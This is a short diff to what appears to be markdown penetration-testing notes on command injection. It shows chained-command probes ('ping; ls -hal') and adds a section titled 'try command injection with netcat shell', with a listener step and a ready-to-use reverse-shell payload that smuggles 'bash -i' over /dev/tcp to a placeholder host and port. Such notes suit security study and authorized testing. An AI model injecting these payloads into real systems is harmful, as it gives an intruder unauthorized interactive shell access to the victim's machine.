@@ -1081,7 +1081,14 @@ insert links here
 ```
 ping; ls -hal
 ping | ls -hal
+```
 
+### try command injection with netcat shell
+
+setup lister
+
+```
+;bash -i >& /dev/tcp/*localhost*/1234 0>&1
 ```
 
 
